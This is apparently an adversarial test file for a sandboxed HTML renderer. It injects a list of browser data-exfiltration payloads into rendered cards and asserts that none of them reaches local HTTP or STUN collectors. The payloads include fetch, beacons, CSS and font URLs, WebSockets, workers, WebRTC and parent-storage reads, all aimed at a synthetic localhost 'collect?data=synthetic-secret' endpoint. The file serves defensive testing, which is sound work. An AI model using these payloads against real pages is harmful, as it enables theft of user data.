/** Synthetic, local-only adversarial and functional checks for the production renderer. */
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import dgram from 'node:dgram';
import { chromium } from 'playwright';
import { build } from 'esbuild';
import { buildServer } from '../dist/app.js';
import { loadConfig } from '../dist/config.js';
import { mintToken } from '../dist/auth.js';
import { VISUAL_CSP } from '../dist/visuals.js';

const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'synthetic-visual-browser-'));
const savedEnv = { ...process.env };
const hits = [];
let app, browser;
const collector = http.createServer((req, res) => { hits.push({ channel: 'http', path: req.url }); res.setHeader('access-control-allow-origin', '*'); res.end('synthetic collector'); });
const udp = dgram.createSocket('udp4');
udp.on('message', msg => hits.push({ channel: 'webrtc', bytes: msg.length }));
await new Promise(resolve => collector.listen(0, '127.0.0.1', resolve));
await new Promise(resolve => udp.bind(0, '127.0.0.1', resolve));
const destination = `http://127.0.0.1:${collector.address().port}/collect?data=synthetic-secret`;
const stun = `stun:127.0.0.1:${udp.address().port}`;
const assertions = [];
try {
  process.env.MINIAPP_CONFIG = path.join(tmp, 'absent-config.json');
  process.env.MINIAPP_STATE_DIR = path.join(tmp, 'state');
  process.env.MINIAPP_SESSIONS_DIR = path.join(tmp, 'sessions');
  await fs.mkdir(process.env.MINIAPP_SESSIONS_DIR);
  const config = loadConfig(), secret = 'synthetic-browser-secret-not-real';
  ({ app } = await buildServer(config, { jwtSecret: secret }));
  app.get('/__visual-lab.js', async (_req, reply) => reply.type('text/javascript').send(`const f=document.querySelector('iframe');addEventListener('message',e=>{if(e.source===f.contentWindow&&e.data?.type==='aside-visual:h'){f.style.height=Math.max(24,Math.min(6000,e.data.h))+'px';document.body.dataset.height=String(e.data.h)}});document.querySelector('#theme').onclick=()=>f.contentWindow.postMessage({type:'aside-visual:theme',scheme:'dark',vars:{'--foreground':'#f5f5f5','--background':'#202124'}},'*');`));
  app.get('/__visual-lab', async (req, reply) => reply.type('text/html').send(`<!doctype html><meta name="viewport" content="width=device-width,initial-scale=1"><title>Visual isolation verification</title><style>body{margin:0;padding:16px;font:14px/1.5 system-ui;color:#252525;background:#f5f5f5}h1{font-size:20px;margin:0 0 8px}button{min-height:44px;padding:0 14px;font:inherit}iframe{border:0;width:100%;height:660px;background:#fff}p{margin:0 0 14px}</style><h1>Interactive cards, isolated</h1><p>Synthetic data only. Native network firewall enabled.</p><button id="theme">Test dark theme</button><iframe sandbox="allow-scripts" title="Synthetic visual" src="${String(req.query.url || '').replace(/["<>]/g, '')}"></iframe><script src="/__visual-lab.js"></script>`));
  app.get('/__unsafe-control', async (_req, reply) => reply.header('content-security-policy', VISUAL_CSP).type('text/html').send(`<script>let p=new RTCPeerConnection({iceServers:[{urls:${JSON.stringify(stun)}}]});p.createDataChannel('synthetic');p.createOffer().then(o=>p.setLocalDescription(o));</script>`));
  app.get('/__redirect', async (_req, reply) => reply.redirect(destination));
  app.get('/__same-origin-collector', async (req, reply) => { hits.push({ channel: 'same-origin', path: req.url }); return reply.send('synthetic'); });
  await app.listen({ host: '127.0.0.1', port: 0 });
  const origin = 'http://127.0.0.1:' + app.server.address().port;
  const bundled = await build({ entryPoints: [path.resolve(import.meta.dirname, '../../web/src/utils/visual.ts')], platform: 'node', format: 'esm', bundle: true, write: false });
  const { composeVisual } = await import('data:text/javascript;base64,' + Buffer.from(bundled.outputFiles[0].text).toString('base64'));
  const authorization = 'Bearer ' + mintToken(secret, { uid: config.allowedUserId, sub: String(config.allowedUserId) });
  const post = async html => { const response = await app.inject({ method: 'POST', url: '/api/visuals', headers: { authorization }, payload: { html: composeVisual(html, { '--foreground': '#252525', '--background': '#ffffff', '--font-sans': 'system-ui' }, 'light') } }); assert.equal(response.statusCode, 200); return response.json().url; };
  browser = await chromium.launch({ channel: process.env.VISUAL_TEST_BROWSER || 'chrome', headless: true, args: ['--use-gl=angle', '--use-angle=swiftshader', '--enable-unsafe-swiftshader'] });
  assert.ok(Number(browser.version().split('.')[0]) >= 152, 'Network isolation test requires Chrome 152+, not an older bundled Chromium.');
  let context = await browser.newContext(); let page = await context.newPage();
  await page.goto(origin + '/__unsafe-control'); await page.waitForTimeout(700);
  assert.ok(hits.some(h => h.channel === 'webrtc'), 'Positive control must prove the UDP collector detects WebRTC without the firewall.');
  assertions.push('positive-control: WebRTC collector detects the unprotected channel');
  await context.close(); hits.length = 0;
  const attacks = {
    location: `location.href=DEST`, replace: `location.replace(DEST)`, anchor: `let a=document.createElement('a');a.href=DEST;a.target='_self';document.body.append(a);a.click()`,
    meta: `let m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url='+DEST;document.head.append(m)`,
    redirect: `location.href='/__redirect'`, sameOrigin: `location.href='/__same-origin-collector?data=synthetic-secret'`,
    fetch: `fetch(DEST).catch(()=>{})`, xhr: `let x=new XMLHttpRequest();x.open('GET',DEST);x.send()`, beacon: `navigator.sendBeacon(DEST,'synthetic')`,
    image: `new Image().src=DEST`, script: `let s=document.createElement('script');s.src=DEST;document.head.append(s)`,
    css: `let s=document.createElement('style');s.textContent='body{background-image:url('+DEST+')}';document.head.append(s)`,
    font: `let s=document.createElement('style');s.textContent='@font-face{font-family:leak;src:url('+DEST+')}body{font-family:leak}';document.head.append(s)`,
    websocket: `new WebSocket(DEST.replace('http:','ws:'))`, prefetch: `let l=document.createElement('link');l.rel='prefetch';l.href=DEST;document.head.append(l)`,
    preconnect: `let l=document.createElement('link');l.rel='preconnect';l.href=DEST;document.head.append(l)`,
    dns: `let l=document.createElement('link');l.rel='dns-prefetch';l.href='//synthetic-no-secret.visual-security.invalid';document.head.append(l)`,
    nested: `let f=document.createElement('iframe');f.src=DEST;document.body.append(f)`,
    worker: `new Worker(URL.createObjectURL(new Blob(['fetch('+JSON.stringify(DEST)+')'],{type:'text/javascript'})))`,
    popup: `open(DEST)`, top: `top.location.href=DEST`,
    rtc: `let p=new RTCPeerConnection({iceServers:[{urls:${JSON.stringify(stun)}}]});p.createDataChannel('synthetic');p.createOffer().then(o=>p.setLocalDescription(o));window.pc=p`,
    blankRealm: `let f=document.createElement('iframe');document.body.append(f);try{let P=f.contentWindow.RTCPeerConnection;let p=new P({iceServers:[{urls:${JSON.stringify(stun)}}]});p.createDataChannel('synthetic');p.createOffer().then(o=>p.setLocalDescription(o))}catch{}`,
    storage: `let r=[];for(let f of [()=>parent.document.body.innerText,()=>parent.localStorage.getItem('synthetic-token'),()=>document.cookie,()=>localStorage.length]){try{r.push(f())}catch{r.push('blocked')}}document.body.dataset.reads=JSON.stringify(r)`,
  };
  for (const mode of ['embedded', 'direct']) for (const [name, code] of Object.entries(attacks)) {
    context = await browser.newContext(); page = await context.newPage(); hits.length = 0;
    const url = await post(`<p>Synthetic private card</p><script>${code.replaceAll('DEST', JSON.stringify(destination))}</script>`);
    await page.goto(origin + (mode === 'embedded' ? '/__visual-lab?url=' + encodeURIComponent(url) : url));
    await page.waitForTimeout(name === 'rtc' || name === 'blankRealm' ? 700 : 70);
    assert.deepEqual(hits, [], `${mode}/${name} reached a network collector`);
    if (name === 'storage') {
      const frame = mode === 'embedded' ? page.frames().find(f => f.url().includes('/api/visuals/')) : page.mainFrame();
      const reads = JSON.parse(await frame.locator('body').getAttribute('data-reads'));
      assert.ok(reads.every(x => x === 'blocked' || x === ''), 'Visual read a protected DOM/storage value');
    }
    assertions.push(`${mode}/${name}: no HTTP or STUN collector hit`);
    await context.close();
  }
  const card = `<!doctype html><title>Interactive verification card</title><style>body{padding:16px;font:14px/1.5 system-ui;background:var(--background);color:var(--foreground)}h2{font-size:18px;margin:0 0 8px}section{margin:0 0 18px}button,input{min-height:44px;font:inherit}button{padding:0 12px}canvas{max-width:100%}#three{width:300px;height:180px}summary{min-height:44px;cursor:pointer}svg{display:block}</style><h2>All interactive, no outbound network</h2><section><button id="add">Add one</button> <output id="count">0</output></section><section><label>Calculator <input aria-label="Calculator" id="slider" type="range" min="0" max="10" value="2"></label> <output id="total">20</output></section><section><button id="tab">Show details</button><p id="details" hidden>Details are interactive</p></section><details><summary>Expand section</summary><p>Expanded content stays inside the card.</p></details><section><canvas id="chart" width="300" height="140"></canvas></section><section><svg id="bars" width="300" height="80"></svg></section><section id="three"></section><script src="https://cdn.jsdelivr.net/npm/chart.js@4.6.1/dist/chart.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/d3@7.9.0/dist/d3.min.js"></script><script>add.onclick=()=>count.textContent=String(+count.textContent+1);slider.oninput=()=>total.textContent=String(+slider.value*10);tab.onclick=()=>details.hidden=!details.hidden;new Chart(chart,{type:'bar',data:{labels:['A','B','C'],datasets:[{data:[3,6,4],backgroundColor:'#43698f'}]},options:{responsive:false,animation:false,plugins:{legend:{display:false}}}});chart.dataset.ready='true';d3.select('#bars').selectAll('rect').data([50,90,130]).join('rect').attr('x',(_,i)=>i*90).attr('y',d=>80-d/2).attr('width',60).attr('height',d=>d/2).attr('fill','#43698f');</script><script type="importmap">{"imports":{"three":"https://cdn.jsdelivr.net/npm/three@0.170.0/build/three.module.js"}}</script><script type="module">import * as THREE from 'three';import {OrbitControls} from 'https://cdn.jsdelivr.net/npm/three@0.170.0/examples/jsm/controls/OrbitControls.js';const r=new THREE.WebGLRenderer({antialias:true,preserveDrawingBuffer:true});r.setSize(300,180);r.setClearColor(0xf3f4f5);document.querySelector('#three').append(r.domElement);const scene=new THREE.Scene();const camera=new THREE.PerspectiveCamera(40,300/180,.1,100);camera.position.z=3;new OrbitControls(camera,r.domElement);document.querySelector('#three').dataset.controls='true';scene.add(new THREE.Mesh(new THREE.BoxGeometry(1,1,1),new THREE.MeshNormalMaterial()));scene.children[0].rotation.set(.4,.7,0);r.render(scene,camera);document.querySelector('#three').dataset.ready='true';</script>`;
  context = await browser.newContext({ viewport: { width: 393, height: 852 } }); page = await context.newPage(); hits.length = 0;
  const demo = await post(card); await page.goto(origin + '/__visual-lab?url=' + encodeURIComponent(demo));
  const frame = page.frameLocator('iframe');
  await frame.locator('#chart[data-ready="true"]').waitFor(); await frame.locator('#three[data-ready="true"][data-controls="true"]').waitFor();
  await frame.getByRole('button', { name: 'Add one' }).click(); assert.equal(await frame.locator('#count').innerText(), '1');
  await frame.getByLabel('Calculator').focus(); await frame.getByLabel('Calculator').press('End'); assert.equal(await frame.locator('#total').innerText(), '100');
  await frame.getByRole('button', { name: 'Show details' }).click(); assert.equal(await frame.locator('#details').isVisible(), true);
  await frame.getByText('Expand section', { exact: true }).click(); assert.equal(await frame.getByText('Expanded content stays inside the card.').isVisible(), true);
  assert.equal(await frame.locator('#bars rect').count(), 3);
  assert.ok(Number(await page.locator('body').getAttribute('data-height')) > 500, 'Automatic height bridge did not run');
  await page.getByRole('button', { name: 'Test dark theme' }).click();
  await frame.locator('html[style*="color-scheme: dark"]').waitFor();
  assert.deepEqual(hits, [], 'Interactive card contacted collector');
  assertions.push('interaction: counter, slider/calculator, tab, disclosure, Chart.js, D3, Three.js WebGL, auto-height, theme');
  if (process.env.VISUAL_TEST_PROOF) { await fs.mkdir(path.dirname(process.env.VISUAL_TEST_PROOF), { recursive: true }); await page.screenshot({ path: process.env.VISUAL_TEST_PROOF, fullPage: true }); }
  await context.close();
  context = await browser.newContext({ userAgent: 'Mozilla/5.0 Chrome/151.0.0.0 Safari/537.36' }); page = await context.newPage();
  const fallback = await post('<p>Readable older-browser card</p><script>document.body.dataset.untrusted="ran"</script>');
  await page.goto(origin + '/__visual-lab?url=' + encodeURIComponent(fallback));
  const old = page.frameLocator('iframe'); await old.getByText('Update to Chrome 152 or newer for this card’s interactive controls.').waitFor();
  assert.equal(await old.locator('body').getAttribute('data-untrusted'), null); assert.ok(Number(await page.locator('body').getAttribute('data-height')) > 24, 'Trusted fallback auto-height failed');
  assertions.push('legacy browser: readable content, clear upgrade note, no untrusted script execution, trusted sizing');
  console.log(JSON.stringify({ browser: browser.version(), assertions: assertions.length, results: assertions, dnsCaveat: 'DNS attack included; HTTP/STUN collectors do not independently observe DNS resolver traffic.' }, null, 2));
} finally {
  await browser?.close(); await app?.close(); await new Promise(resolve => collector.close(resolve)); udp.close();
  process.env = savedEnv; await fs.rm(tmp, { recursive: true, force: true });
}
